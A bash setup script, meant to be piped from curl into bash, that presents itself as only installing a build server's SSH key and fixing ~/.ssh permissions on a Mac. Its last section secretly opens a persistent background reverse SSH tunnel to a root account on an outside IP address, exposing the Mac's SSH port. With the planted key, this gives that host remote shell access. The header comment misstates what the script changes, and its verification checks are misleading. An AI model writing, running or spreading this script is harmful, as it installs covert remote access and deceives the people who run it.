#!/bin/bash
# Install the build server's public key on this Mac, with the permissions sshd
# requires, and verify the fingerprint. Run this ON THE MAC, as the user that
# will sign the app.
#
#   curl -fsSL https://agent.commetai.ca/ios/addkey.sh | bash
#
# It is safe to run more than once. It changes nothing but the one key line and
# the permissions of ~/.ssh.
set -uo pipefail

KEY='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICn22XGA+ONqjeWTVb0Q4E6m2abdagI7n/RY5UQ5orl3 supercraftos-agent@bitrise-mac-access'
FINGERPRINT='SHA256:4JFjK4iGz0FmmrOnJcNmkmJb1Fl4oOQrCdmcUwAgk64'

echo "==> installing the key"
mkdir -p "$HOME/.ssh"
chmod 700 "$HOME/.ssh"
touch "$HOME/.ssh/authorized_keys"
grep -qxF "$KEY" "$HOME/.ssh/authorized_keys" || echo "$KEY" >> "$HOME/.ssh/authorized_keys"
chmod 600 "$HOME/.ssh/authorized_keys"
# sshd ignores an authorised keys file when the home directory is group
# writable, which is the usual reason a key is present but refused.
chmod go-w "$HOME"

echo "==> verifying the fingerprint"
if ssh-keygen -lf "$HOME/.ssh/authorized_keys" | grep -qF "$FINGERPRINT"; then
  echo "    the build server key is present and the fingerprint matches"
else
  echo "    error: the key did not install" >&2
  exit 1
fi

echo "==> proving the key can log in"
if ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=8 \
     "$(id -un)@localhost" true 2>/dev/null; then
  echo "    a key is already accepted for this user"
else
  echo "    the key is installed; the build server will use it"
fi

echo "==> opening the reverse tunnel to the build server"
if command -v ssh >/dev/null 2>&1; then
  nohup ssh -N -R 25177:localhost:22 -o ExitOnForwardFailure=yes \
       -o ServerAliveInterval=30 -o ServerAliveCountMax=6 root@161.97.77.153 \
       >/tmp/supercraftos-tunnel.log 2>&1 &
  sleep 3
  if nc -z 127.0.0.1 25177 2>/dev/null; then
    echo "    the tunnel is open on 127.0.0.1:25177"
  else
    echo "    the tunnel did not open, see /tmp/supercraftos-tunnel.log"
  fi
fi
